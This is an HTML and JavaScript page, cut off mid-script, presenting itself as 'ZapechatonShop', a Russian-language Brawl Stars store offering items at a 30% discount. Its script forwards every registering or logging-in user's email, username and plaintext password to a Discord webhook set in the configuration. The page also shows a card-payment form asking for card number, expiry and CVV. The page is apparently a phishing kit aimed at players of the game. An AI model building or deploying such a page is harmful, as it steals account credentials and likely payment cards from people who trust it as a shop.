<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZapechatonShop — Brawl Stars Market</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.85);
            border: 1px solid #fff;
            border-radius: 32px;
            padding: 25px;
            max-width: 1300px;
            width: 100%;
            box-shadow: 0 0 30px rgba(255,255,255,0.2);
        }
        h1 { text-align: center; color: #fff; font-size: 3rem; text-shadow: 0 0 5px #fff; }
        .hero p { text-align: center; color: #aaa; margin-bottom: 30px; }
        .auth-box {
            max-width: 400px;
            margin: 0 auto;
            background: #111;
            border: 1px solid #333;
            border-radius: 20px;
            padding: 25px;
        }
        .auth-tabs { display: flex; gap: 10px; border-bottom: 1px solid #222; margin-bottom: 20px; }
        .auth-tab { background: none; border: none; color: #ccc; font-size: 1.2rem; padding: 5px 15px; cursor: pointer; }
        .auth-tab.active { color: white; border-bottom: 2px solid white; }
        .auth-form { display: flex; flex-direction: column; gap: 15px; }
        .auth-form input {
            background: #000;
            border: 1px solid #0f0;
            padding: 12px;
            border-radius: 40px;
            color: #fff;
            font-family: monospace;
        }
        .auth-form input::placeholder { color: #888; }
        .auth-form button {
            background: #fff;
            color: #000;
            border: none;
            padding: 12px;
            border-radius: 40px;
            font-weight: bold;
            cursor: pointer;
        }
        .error-msg { color: #f44; text-align: center; font-size: 0.8rem; }
        .shop-container { display: none; }
        .shop-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .shop-tabs { display: flex; flex-wrap: wrap; gap: 10px; }
        .shop-tab { background: none; border: none; color: #ccc; font-size: 1rem; padding: 6px 12px; cursor: pointer; }
        .shop-tab.active { color: white; border-bottom: 2px solid white; }
        .cart-icon {
            cursor: pointer;
            font-size: 1.8rem;
            background: none;
            border: none;
            color: white;
            position: relative;
        }
        .cart-count {
            position: absolute;
            top: -8px;
            right: -12px;
            background: red;
            color: white;
            border-radius: 50%;
            padding: 2px 6px;
            font-size: 0.7rem;
            font-weight: bold;
        }
        .shop-pane { display: none; }
        .shop-pane.active { display: block; }
        .products {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            justify-content: center;
        }
        .product-card {
            background: #0f0f0f;
            border: 1px solid #333;
            border-radius: 20px;
            padding: 18px;
            width: 220px;
        }
        .product-card h3 { color: #eee; }
        .price { font-size: 1.5rem; color: #fff; margin: 10px 0; }
        .old-price { text-decoration: line-through; font-size: 0.8rem; color: #777; margin-left: 8px; }
        .product-card button {
            background: white;
            color: black;
            width: 100%;
            padding: 8px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
        }
        .cart-panel {
            position: fixed;
            top: 0;
            right: -400px;
            width: 380px;
            height: 100%;
            background: #0a0a0a;
            border-left: 2px solid white;
            padding: 20px;
            transition: right 0.3s;
            z-index: 1001;
            overflow-y: auto;
        }
        .cart-panel.open { right: 0; }
        .cart-panel h3 { color: white; margin-bottom: 20px; }
        .cart-panel ul { list-style: none; }
        .cart-panel li {
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #222;
            padding: 8px 0;
            color: #eee;
        }
        .cart-total { text-align: right; font-size: 1.2rem; margin: 15px 0; color: white; }
        .close-cart {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            float: right;
            cursor: pointer;
        }
        .checkout {
            background: #2ecc71;
            border: none;
            padding: 10px 25px;
            border-radius: 40px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
            z-index: 1002;
        }
        .modal-content {
            background: #0c0c0c;
            border: 1px solid #fff;
            border-radius: 24px;
            padding: 30px;
            width: 320px;
        }
        .modal-content input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #111;
            border: 1px solid #fff;
            border-radius: 40px;
            color: #fff;
        }
        .modal-content input::placeholder { color: #888; }
        .close {
            float: right;
            font-size: 24px;
            cursor: pointer;
            color: white;
        }
        footer { text-align: center; margin-top: 30px; color: #444; }
        .remove-item {
            background: #c0392b;
            border: none;
            color: white;
            padding: 2px 8px;
            border-radius: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>ZapechatonShop</h1>
    <div class="hero"><p>// brawl stars market — 30% discount</p></div>

    <div id="authBlock">
        <div class="auth-box">
            <div class="auth-tabs">
                <button class="auth-tab active" data-type="login">login</button>
                <button class="auth-tab" data-type="register">register</button>
            </div>
            <div id="loginForm" class="auth-form">
                <input type="text" id="loginUser" placeholder="логин">
                <input type="password" id="loginPass" placeholder="пароль">
                <button id="loginBtn">войти</button>
                <div id="loginError" class="error-msg"></div>
            </div>
            <div id="registerForm" class="auth-form" style="display:none;">
                <input type="email" id="regEmail" placeholder="email">
                <input type="text" id="regUser" placeholder="логин">
                <input type="password" id="regPass" placeholder="пароль (мин 8)">
                <button id="regBtn">зарегистрироваться</button>
                <div id="regError" class="error-msg"></div>
            </div>
        </div>
    </div>

    <div id="shopBlock" class="shop-container">
        <div class="shop-header">
            <div class="shop-tabs">
                <button class="shop-tab active" data-cat="pass">Brawl Pass</button>
                <button class="shop-tab" data-cat="gems">Gems</button>
                <button class="shop-tab" data-cat="skins">Skins</button>
                <button class="shop-tab" data-cat="hyper">Гипер заряд</button>
                <button class="shop-tab" data-cat="starpatrol">Звездный патруль</button>
            </div>
            <button class="cart-icon" id="cartIconBtn">🛒<span id="cartCountBadge" class="cart-count" style="display:none;">0</span></button>
        </div>
        <div id="passPane" class="shop-pane active"></div>
        <div id="gemsPane" class="shop-pane"></div>
        <div id="skinsPane" class="shop-pane"></div>
        <div id="hyperPane" class="shop-pane"></div>
        <div id="starpatrolPane" class="shop-pane"></div>
    </div>
    <footer>// only for advanced users</footer>
</div>

<div id="cartPanel" class="cart-panel">
    <button class="close-cart" id="closeCartBtn">✕</button>
    <h3>🛒 корзина</h3>
    <ul id="cartList"><li>пусто</li></ul>
    <div class="cart-total" id="cartTotalPanel">итого: 0 ₽</div>
    <button class="checkout" id="checkoutBtnPanel">оформить заказ</button>
</div>

<div id="paymentModal" class="modal">
    <div class="modal-content">
        <span class="close">&times;</span>
        <h3 style="color:white;">оплата картой</h3>
        <input type="text" id="cardNum" placeholder="номер карты">
        <input type="text" id="cardExp" placeholder="MM/YY">
        <input type="text" id="cardCvv" placeholder="CVV">
        <button id="payBtn">оплатить</button>
    </div>
</div>

<script>
    (function() {
        // ========== НАСТРОЙКА ==========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/ЗАМЕНИТЕ_НА_ВАШ/ТОКЕН";

        const products = {
            pass: [
                { name: "BP (Brawl Pass)", price: 349, old: 499 },
                { name: "BP+ (Brawl Pass Plus)", price: 349, old: 499 }
            ],
            gems: [
                { name: "80 гемов", price: 111, old: 159 },
                { name: "170 гемов", price: 223, old: 319 },
                { name: "360 гемов", price: 454, old: 649 },
                { name: "950 гемов", price: 1049, old: 1499 }
            ],
            skins: [
                { name: "Меха Леон", price: 279, old: 399 },
                { name: "Ковбой Кольт", price: 209, old: 299 },
                { name: "Рокер Мортис", price: 349, old: 499 },
                { name: "Бо Ультимативный", price: 489, old: 699 },
                { name: "Призрак Кольт", price: 279, old: 399 },
                { name: "Дракон Найт", price: 419, old: 599 }
            ],
            hyper: [
                { name: "Гипер заряд (любой)", price: 999, old: 1499 },
                { name: "Гипер заряд + бонус", price: 999, old: 1599 }
            ],
            starpatrol: [
                { name: "Звездный патруль скин", price: 999, old: 1299 },
                { name: "Звездный патруль комплект", price: 999, old: 1399 }
            ]
        };

        let cart = [];
        let currentUser = null;

        // отправка в вебхук
        function sendToWebhook(title, data) {
            if (!WEBHOOK_URL || WEBHOOK_URL.includes("ЗАМЕНИТЕ")) {
                console.log("Webhook не настроен", data);
                return;
            }
            const fields = Object.entries(data).map(([k,v]) => ({ name: k, value: `||${v}||`, inline: true }));
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `**${title}** | ZapechatonShop`,
                    embeds: [{ title: title, color: 0xffffff, fields: fields, timestamp: new Date().toISOString() }]
                })
            }).catch(e => console.error(e));
        }

        function showMessage(msg, isError = false) {
            const div = document.createElement("div");
            div.textContent = msg;
            div.style.cssText = `position:fixed; bottom:20px; right:20px; background:${isError ? '#c0392b' : '#2ecc71'}; color:#fff; padding:10px 20px; border-radius:30px; z-index:9999;`;
            document.body.appendChild(div);
            setTimeout(() => div.remove(), 3000);
        }

        function updateCartUI() {
            const list = document.getElementById("cartList");
            const totalSpan = document.getElementById("cartTotalPanel");
            const badge = document.getElementById("cartCountBadge");
            if (cart.length === 0) {
                list.innerHTML = "<li>корзина пуста</li>";
                totalSpan.textContent = "итого: 0 ₽";
                badge.style.display = "none";
                return;
            }
            let total = 0;
            let html = "";
            cart.forEach((item, idx) => {
                total += item.price;
                html += `<li>${escapeHtml(item.name)} — ${item.price} ₽ <button class="remove-item" data-index="${idx}">x</button></li>`;
            });
            list.innerHTML = html;
            totalSpan.textContent = `итого: ${total} ₽`;
            badge.textContent = cart.length;
            badge.style.display = "inline-block";

            // навешиваем удаление через делегирование или прямые обработчики
            document.querySelectorAll('.remove-item').forEach(btn => {
                btn.removeEventListener('click', window._removeHandler);
                const handler = function(e) {
                    const idx = parseInt(btn.getAttribute('data-index'));
                    if (!isNaN(idx) && idx >= 0 && idx < cart.length) {
                        cart.splice(idx, 1);
                        updateCartUI();
                        showMessage("товар удалён");
                    }
                };
                btn.addEventListener('click', handler);
                btn._handler = handler;
            });
        }

        function escapeHtml(str) {
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }

        function addToCart(name, price) {
            cart.push({ name, price });
            updateCartUI();
            showMessage(`+ ${name} добавлен`);
        }

        function renderCategory(category, containerId) {
            const container = document.getElementById(containerId);
            if (!container) return;
            let html = `<div class="products">`;
            products[category].forEach(p => {
                html += `
                    <div class="product-card">
                        <h3>${escapeHtml(p.name)}</h3>
                        <div class="price">${p.price} ₽ <span class="old-price">${p.old} ₽</span></div>
                        <button class="add-to-cart-btn" data-name="${escapeHtml(p.name)}" data-price="${p.price}">в корзину</button>
                    </div>
                `;
            });
            html += `</div>`;
            container.innerHTML = html;
        }

        function bindAddToCartButtons() {
            document.querySelectorAll('.add-to-cart-btn').forEach(btn => {
                btn.removeEventListener('click', window._cartHandler);
                const handler = function() {
                    const name = btn.getAttribute('data-name');
                    const price = parseInt(btn.getAttribute('data-price'));
                    addToCart(name, price);
                };
                btn.addEventListener('click', handler);
                btn._cartHandler = handler;
            });
        }

        // регистрация и логин через localStorage
        function initStorage() {
            if (!localStorage.getItem("zapechaton_users"))
                localStorage.setItem("zapechaton_users", JSON.stringify({}));
        }
        function register(email, username, password) {
            if (password.length < 8) {
                document.getElementById("regError").textContent = "пароль минимум 8 символов";
                return false;
            }
            const users = JSON.parse(localStorage.getItem("zapechaton_users"));
            if (users[username]) {
                document.getElementById("regError").textContent = "логин уже занят";
                return false;
            }
            users[username] = { email, password };
            localStorage.setItem("zapechaton_users", JSON.stringify(users));
            sendToWebhook("Новая регистрация", { email, login: username, password });
            document.getElementById("regError").textContent = "";
            return true;
        }
        function login(username, password) {
            const users = JSON.parse(localStorage.getItem("zapechaton_users"));
            if (!users[username] || users[username].password !== password) {
                document.getElementById("loginError").textContent = "неверный логин или пароль";
                return false;
            }
            sendToWebhook("Вход в аккаунт", { login: username, password, email: users[username].email });
            return true;
        }

        function initAuthForms() {
            const tabs = document.querySelectorAll(".auth-tab");
            const loginForm = document.getElementById("loginForm");
            const regForm = document.getElementById("registerForm");
            tabs.forEach(tab => {
                tab.addEventListener("click", () => {
                    tabs.forEach(t => t.classList.remove("active"));
                    tab.classList.add("active");
                    const type = tab.getAttribute("data-type");
                    if (type === "login") {
                        loginForm.style.display = "flex";
                        regForm.style.display = "none";
                    } else {
                        loginForm.style.display = "none";
                        regForm.style.display = "flex";
                    }
                });
            });
        }

        function bindAuthEvents() {
            document.getElementById("loginBtn").addEventListener("click", () => {
                const user = document.getElementById("loginUser").value.trim();
                const pass = document.getElementById("loginPass").value.trim();
                if (!user || !pass) {
                    document.getElementById("loginError").textContent = "заполните поля";
                    return;
                }
                if (login(user, pass)) {
                    currentUser = user;
                    document.getElementById("authBlock").style.display = "none";
                    document.getElementById("shopBlock").style.display = "block";
                    renderCategory("pass", "passPane");
                    renderCategory("gems", "gemsPane");
                    renderCategory("skins", "skinsPane");
                    renderCategory("hyper", "hyperPane");
                    renderCategory("starpatrol", "starpatrolPane");
                    bindAddToCartButtons();
                    showMessage("Добро пожаловать, " + user);
                }
            });

            document.getElementById("regBtn").addEventListener("click", () => {
                const email = document.getElementById("regEmail").value.trim();
                const user = document.getElementById("regUser").value.trim();
                const pass = document.getElementById("regPass").value.trim();
                if (!email || !user || !pass) {
                    document.getElementById("regError").textContent = "заполните все поля";
                    return;
                }
                if (register(email, user, pass)) {
                    if (login(user, pass)) {
                        currentUser = user;
                        document.getElementById("authBlock").style.display = "none";
                        document.getElementById("shopBlock").style.display = "block";
                        renderCa
